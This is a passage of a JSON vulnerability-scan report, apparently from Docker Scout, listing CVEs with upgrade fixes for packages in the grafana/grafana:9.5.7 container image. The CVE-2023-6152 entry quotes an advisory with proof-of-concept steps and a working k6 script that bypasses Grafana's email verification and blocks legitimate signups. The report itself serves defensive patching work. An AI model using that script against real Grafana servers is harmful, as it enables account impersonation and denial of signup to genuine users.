          "name": "CVE-2024-11741",
          "value": "CVE-2024-11741",
          "url": "https://scout.docker.com/v/CVE-2024-11741?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3E%3D1.9.2%2C%3C10.4.15"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-11741?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3E%3D1.9.2%2C%3C10.4.15"
        }
      ]
    },
    {
      "id": "00f453bf9fff80e73fd3b91f7ff07f2240c466cfe16a26d85762c9f83d1a23b1",
      "category": "container_scanning",
      "message": "CVE-2024-28180 on github.com/go-jose/go-jose@3.0.0",
      "description": "### Impact\nAn attacker could send a JWE containing compressed data that used large amounts of memory and CPU when decompressed by Decrypt or DecryptMulti. Those functions now return an error if the decompressed data would exceed 250kB or 10x the compressed size (whichever is larger). Thanks to Enze Wang@Alioth and Jianjun Chen@Zhongguancun Lab (@zer0yu and @chenjj) for reporting.\n\n### Patches\nThe problem is fixed in the following packages and versions:\n- github.com/go-jose/go-jose/v4 version 4.0.1\n- github.com/go-jose/go-jose/v3 version 3.0.3\n- gopkg.in/go-jose/go-jose.v2 version 2.6.3\n\nThe problem will not be fixed in the following package because the package is archived:\n- gopkg.in/square/go-jose.v2",
      "cve": "CVE-2024-28180",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/go-jose/go-jose@3.0.0 to 3.0.3",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/go-jose/go-jose@3.0.0#v3"
          },
          "version": "3.0.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-28180",
          "value": "CVE-2024-28180",
          "url": "https://scout.docker.com/v/CVE-2024-28180?s=github&n=v3&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C3.0.3"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-28180?s=github&n=v3&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C3.0.3"
        }
      ]
    },
    {
      "id": "8026160cc5c8d3e11a2934362de6d671d135c063fb8aea337347bfcd191be7a7",
      "category": "container_scanning",
      "message": "CVE-2024-34155 on stdlib@1.20.6",
      "description": "Calling any of the Parse functions on Go source code which contains deeply nested literals can cause a panic due to stack exhaustion.",
      "cve": "CVE-2024-34155",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.22.7",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-34155",
          "value": "CVE-2024-34155",
          "url": "https://scout.docker.com/v/CVE-2024-34155?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-34155?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"
        }
      ]
    },
    {
      "id": "9eb3aed3d0042d5757f6685855edfcf269152499916374c0a2bdd20ede73ec49",
      "category": "container_scanning",
      "message": "CVE-2024-6874 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2024-6874",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/curl@8.2.0-r1 to 8.9.0-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-6874",
          "value": "CVE-2024-6874",
          "url": "https://scout.docker.com/v/CVE-2024-6874?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.9.0-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-6874?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.9.0-r0"
        }
      ]
    },
    {
      "id": "e18e45a79a3fb934f525952d0899e91ea85dda2f8d63cd7b42c76b8c445d7375",
      "category": "container_scanning",
      "message": "CVE-2024-9143 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2024-9143",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.15-r1",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-9143",
          "value": "CVE-2024-9143",
          "url": "https://scout.docker.com/v/CVE-2024-9143?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.15-r1"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-9143?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.15-r1"
        }
      ]
    },
    {
      "id": "760963e0ce66220847dff80e292a85d76eca152fe7c12005f4465ff9c08dc528",
      "category": "container_scanning",
      "message": "CVE-2025-22870 on golang.org/x/net@0.8.0",
      "description": "Matching of hosts against proxy patterns can improperly treat an IPv6 zone ID as a hostname component. For example, when the NO_PROXY environment variable is set to \"*.example.com\", a request to \"[::1%25.example.com]:80` will incorrectly match and not be proxied.",
      "cve": "CVE-2025-22870",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade golang.org/x/net@0.8.0 to 0.36.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/golang.org/x/net@0.8.0"
          },
          "version": "0.8.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-22870",
          "value": "CVE-2025-22870",
          "url": "https://scout.docker.com/v/CVE-2025-22870?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.36.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-22870?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.36.0"
        }
      ]
    },
    {
      "id": "5e576bf97506e7e86b23bb43102a2260581ce88d952bfb55735f2498b1903efc",
      "category": "container_scanning",
      "message": "CVE-2023-4039 on alpine/gcc@12.2.1_git20220924-r4",
      "cve": "CVE-2023-4039",
      "severity": "Medium",
      "confidence": "Unknown",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/gcc@12.2.1_git20220924-r4?os_name=alpine&os_version=3.17"
          },
          "version": "12.2.1_git20220924-r4"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-4039",
          "value": "CVE-2023-4039",
          "url": "https://scout.docker.com/v/CVE-2023-4039?s=alpine&n=gcc&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D12.2.1_git20220924-r4"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-4039?s=alpine&n=gcc&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D12.2.1_git20220924-r4"
        }
      ]
    },
    {
      "id": "951bd1d058b636d2852cf41cd539a0439d8b4e91bd0d302113bd9928212f420b",
      "category": "container_scanning",
      "message": "CVE-2023-29409 on stdlib@1.20.6",
      "description": "Extremely large RSA keys in certificate chains can cause a client/server to expend significant CPU time verifying signatures.\n\nWith fix, the size of RSA keys transmitted during handshakes is restricted to <= 8192 bits.\n\nBased on a survey of publicly trusted RSA keys, there are currently only three certificates in circulation with keys larger than this, and all three appear to be test certificates that are not actively deployed. It is possible there are larger keys in use in private PKIs, but we target the web PKI, so causing breakage here in the interests of increasing the default safety of users of crypto/tls seems reasonable.",
      "cve": "CVE-2023-29409",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.20.7",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-29409",
          "value": "CVE-2023-29409",
          "url": "https://scout.docker.com/v/CVE-2023-29409?s=golang&n=stdlib&t=golang&vr=%3E%3D1.20.0-0%2C%3C1.20.7"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-29409?s=golang&n=stdlib&t=golang&vr=%3E%3D1.20.0-0%2C%3C1.20.7"
        }
      ]
    },
    {
      "id": "f93eaaf2bb1894a810870ca1bfaecbb27c1e7bc4073668900d89f170be31ceef",
      "category": "container_scanning",
      "message": "CVE-2023-2975 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2023-2975",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.9-r2",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-2975",
          "value": "CVE-2023-2975",
          "url": "https://scout.docker.com/v/CVE-2023-2975?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.9-r2"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-2975?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.9-r2"
        }
      ]
    },
    {
      "id": "6dddfac13a2a2679154b41c251edfb6bca078a56b6f1f07218e250dbccc14c52",
      "category": "container_scanning",
      "message": "CVE-2023-3446 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2023-3446",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.9-r3",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-3446",
          "value": "CVE-2023-3446",
          "url": "https://scout.docker.com/v/CVE-2023-3446?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.9-r3"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-3446?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.9-r3"
        }
      ]
    },
    {
      "id": "ca0dfb0856161a95c3caa0bdbeb0d631668432ae3d1e7c2a536d4304d481a246",
      "category": "container_scanning",
      "message": "CVE-2023-3817 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2023-3817",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.10-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-3817",
          "value": "CVE-2023-3817",
          "url": "https://scout.docker.com/v/CVE-2023-3817?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.10-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-3817?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.10-r0"
        }
      ]
    },
    {
      "id": "5977ff6d894c55eee876d25991a30eb2d4ea801c6082dfd784293cdcffd2f756",
      "category": "container_scanning",
      "message": "CVE-2023-39326 on stdlib@1.20.6",
      "description": "A malicious HTTP sender can use chunk extensions to cause a receiver reading from a request or response body to read many more bytes from the network than are in the body.\n\nA malicious HTTP client can further exploit this to cause a server to automatically read a large amount of data (up to about 1GiB) when a handler fails to read the entire body of a request.\n\nChunk extensions are a little-used HTTP feature which permit including additional metadata in a request or response body sent using the chunked encoding. The net/http chunked encoding reader discards this metadata. A sender can exploit this by inserting a large metadata segment with each byte transferred. The chunk reader now produces an error if the ratio of real body to encoded bytes grows too small.",
      "cve": "CVE-2023-39326",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.20.12",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-39326",
          "value": "CVE-2023-39326",
          "url": "https://scout.docker.com/v/CVE-2023-39326?s=golang&n=stdlib&t=golang&vr=%3C1.20.12"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-39326?s=golang&n=stdlib&t=golang&vr=%3C1.20.12"
        }
      ]
    },
    {
      "id": "e96a080a7fec04fedcb1bc1450ead25efde2a112648b7355ae14599da38d05e6",
      "category": "container_scanning",
      "message": "CVE-2023-45284 on stdlib@1.20.6",
      "description": "On Windows, The IsLocal function does not correctly detect reserved device names in some cases.\n\nReserved names followed by spaces, such as \"COM1 \", and reserved names \"COM\" and \"LPT\" followed by superscript 1, 2, or 3, are incorrectly reported as local.\n\nWith fix, IsLocal now correctly reports these names as non-local.",
      "cve": "CVE-2023-45284",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.20.11",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-45284",
          "value": "CVE-2023-45284",
          "url": "https://scout.docker.com/v/CVE-2023-45284?s=golang&n=stdlib&t=golang&vr=%3C1.20.11"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-45284?s=golang&n=stdlib&t=golang&vr=%3C1.20.11"
        }
      ]
    },
    {
      "id": "5dcbf23547ba933183bfbc14e2c6ff94ed85ba580b02f74b631480281fa42d6f",
      "category": "container_scanning",
      "message": "CVE-2023-45288 on golang.org/x/net@0.8.0",
      "description": "An attacker may cause an HTTP/2 endpoint to read arbitrary amounts of header data by sending an excessive number of CONTINUATION frames. Maintaining HPACK state requires parsing and processing all HEADERS and CONTINUATION frames on a connection. When a request's headers exceed MaxHeaderBytes, no memory is allocated to store the excess headers, but they are still parsed. This permits an attacker to cause an HTTP/2 endpoint to read arbitrary amounts of header data, all associated with a request which is going to be rejected. These headers can include Huffman-encoded data which is significantly more expensive for the receiver to decode than for an attacker to send. The fix sets a limit on the amount of excess header frames we will process before closing a connection.",
      "cve": "CVE-2023-45288",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade golang.org/x/net@0.8.0 to 0.23.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/golang.org/x/net@0.8.0"
          },
          "version": "0.8.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-45288",
          "value": "CVE-2023-45288",
          "url": "https://scout.docker.com/v/CVE-2023-45288?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.23.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-45288?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.23.0"
        }
      ]
    },
    {
      "id": "eb07369f41aeb9e7d8744aff77c83d43762796a64ad71d3ffef829f63212a3fa",
      "category": "container_scanning",
      "message": "CVE-2023-46219 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2023-46219",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/curl@8.2.0-r1 to 8.5.0-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-46219",
          "value": "CVE-2023-46219",
          "url": "https://scout.docker.com/v/CVE-2023-46219?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.5.0-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-46219?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.5.0-r0"
        }
      ]
    },
    {
      "id": "bd9102f12efb65baf3f94a1ea6937ec4b33c89e2096ca68946acae9dd7563df7",
      "category": "container_scanning",
      "message": "CVE-2023-5678 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2023-5678",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.12-r1",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-5678",
          "value": "CVE-2023-5678",
          "url": "https://scout.docker.com/v/CVE-2023-5678?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r1"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-5678?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r1"
        }
      ]
    },
    {
      "id": "631f035736082d9aa01d2f4c27509e712276098aa414d162ff0493187aa175f5",
      "category": "container_scanning",
      "message": "CVE-2024-0853 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2024-0853",
      "severity": "Medium",
      "confidence": "Unknown",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-0853",
          "value": "CVE-2024-0853",
          "url": "https://scout.docker.com/v/CVE-2024-0853?s=docker&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.6.0-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-0853?s=docker&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.6.0-r0"
        }
      ]
    },
    {
      "id": "b7927d9030dff6cabb3c89991bd52ffbe3c964d9b768afd502327ab690aaf123",
      "category": "container_scanning",
      "message": "CVE-2024-28182 on alpine/nghttp2@1.51.0-r1",
      "cve": "CVE-2024-28182",
      "severity": "Medium",
      "confidence": "Unknown",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/nghttp2@1.51.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "1.51.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-28182",
          "value": "CVE-2024-28182",
          "url": "https://scout.docker.com/v/CVE-2024-28182?s=alpine&n=nghttp2&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D1.51.0-r2"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-28182?s=alpine&n=nghttp2&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D1.51.0-r2"
        }
      ]
    },
    {
      "id": "0464fcbd9f3911e98f0a1896b07660c3e0703b6c689148487b95685e37304d84",
      "category": "container_scanning",
      "message": "CVE-2024-45338 on golang.org/x/net@0.8.0",
      "description": "An attacker can craft an input to the Parse functions that would be processed non-linearly with respect to its length, resulting in extremely slow parsing. This could cause a denial of service.",
      "cve": "CVE-2024-45338",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade golang.org/x/net@0.8.0 to 0.33.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/golang.org/x/net@0.8.0"
          },
          "version": "0.8.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-45338",
          "value": "CVE-2024-45338",
          "url": "https://scout.docker.com/v/CVE-2024-45338?s=golang&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.33.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-45338?s=golang&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.33.0"
        }
      ]
    },
    {
      "id": "607e49f30cdb790c08020183276ec72671e18275da68b03d0468fb527d83c60d",
      "category": "container_scanning",
      "message": "CVE-2024-4603 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2024-4603",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.13-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-4603",
          "value": "CVE-2024-4603",
          "url": "https://scout.docker.com/v/CVE-2024-4603?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.13-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-4603?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.13-r0"
        }
      ]
    },
    {
      "id": "afdb90d1d6df31fef666f065b9c9a9a8a7a8312ce1c7ebe03ac3b2322f577c66",
      "category": "container_scanning",
      "message": "CVE-2025-22872 on golang.org/x/net@0.8.0",
      "description": "The tokenizer incorrectly interprets tags with unquoted attribute values that end with a solidus character (/) as self-closing. When directly using Tokenizer, this can result in such tags incorrectly being marked as self-closing, and when using the Parse functions, this can result in content following such tags as being placed in the wrong scope during DOM construction, but only when tags are in foreign content (e.g. <math>, <svg>, etc contexts).",
      "cve": "CVE-2025-22872",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade golang.org/x/net@0.8.0 to 0.38.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/golang.org/x/net@0.8.0"
          },
          "version": "0.8.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-22872",
          "value": "CVE-2025-22872",
          "url": "https://scout.docker.com/v/CVE-2025-22872?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.38.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-22872?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.38.0"
        }
      ]
    },
    {
      "id": "1850ca96cb0f3e5b0cf69313a47ce5edd99c56336851a2f7bacae183f8de67d1",
      "category": "container_scanning",
      "message": "CVE-2023-6152 on github.com/grafana/grafana@9.5.7",
      "description": "### Summary\nEmail validation can easily be bypassed because `verify_email_enabled` option enable email validation at sign up only.\nA user changing it's email after signing up (and verifying it) can change it without verification in `/profile`.\nThis can be used to prevent legitimate owner of the email address from signing up.\n\nAnother way to prevent email's owner from signing up is by setting Username as an email:\nWhen a new user is registrering, they can set two different email addresses in the Email and Username field, technically having 2 email addresses (because Grafana handles usernames and emails the same in some situations), but only the former is validated.\n\n![](https://user-images.githubusercontent.com/44581623/282073913-c1a8c20b-b6c3-46eb-840c-9e0dae718a2a.png)\n\nHere user a prevents owner of bar@example.com to signup.\n\n### Details\nI don't know exact location but this is related to PUT /api/user handler.\n\n### PoC\nBypass email validation:\n* Start a new grafana instance using latest version\n* Sign up with email foo@example.\n* Login to that account.\n* Go to profile and change email to  bar@example.com\n* That's it, your using an email you don't own.\n\nPrevent email's owner from signing up:\n* Start a new grafana instance using latest version\n* Sign up with email foo@example.\n* Login to that account.\n* Go to profile and change username (not email) to [bar@example.com](mailto:bar@example.com)\n* Signout.\n* Try to sign up with email [b@example.com](mailto:b@example.com)\n* Warning popup \"User with same email address already exists\"\n\nK6 script (with `verify_email_enabled` set to `false`):\n```js\nimport { check, group } from \"k6\"\nimport http from \"k6/http\"\n\nexport const options = {\n  scenarios: {\n    perVuIter: {\n      executor: 'per-vu-iterations',\n      vus: 1,\n      iterations: 1\n    }\n  }\n}\n\nconst GRAFANA_URL = __ENV.GRAFANA_URL || \"http://localhost:3000\"\n\nexport default function () {\n  group(\"create user_a with email foo@example.com\", () => {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) => r.status == 200\n    })\n  })\n\n  group(\"change user_a login to bar@example.com\", () => {\n    const response = http.put(`${GRAFANA_URL}/api/user`, JSON.stringify({\n      \"email\": \"foo@example.com\",\n      \"login\": \"bar@example.com\", // user_b email.\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) => r.status == 200\n    })\n  })\n\n  http.cookieJar().clear(GRAFANA_URL)\n\n  group(\"create user_b with email bar@example.com\", () => {\n    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({\n      \"email\": \"bar@example.com\",\n      \"username\": \"bar@example.com\",\n      \"password\": \"password\"\n    }), {\n      headers: {\n        'Content-Type': \"application/json\"\n      }\n    })\n\n    check(response, {\n      'status code is 200': (r) => r.status == 200 // fail\n    })\n  })\n}\n```\n\n### Impact\nBypass email verification.\nPrevent legitimate owner from signing up.",
      "cve": "CVE-2023-6152",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/grafana/grafana@9.5.7 to 9.5.16",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/grafana/grafana@9.5.7"
          },
          "version": "9.5.7"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-6152",
          "value": "CVE-2023-6152",
          "url": "https://scout.docker.com/v/CVE-2023-6152?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3E%3D2.5.0%2C%3C9.5.16"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-6152?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3E%3D2.5.0%2C%3C9.5.16"
        }
      ]
    },
    {
      "id": "3651b30de07c6d5c75e9db58c32929eb4d8c9e6f4dc6e1f5c185be86498b3abc",
      "category": "container_scanning",
      "message": "CVE-2024-24785 on stdlib@1.20.6",
      "description": "If errors returned from MarshalJSON methods contain user controlled data, they may be used to break the contextual auto-escaping behavior of the html/template package, allowing for subsequent actions to inject unexpected content into templates.",
      "cve": "CVE-2024-24785",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.21.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
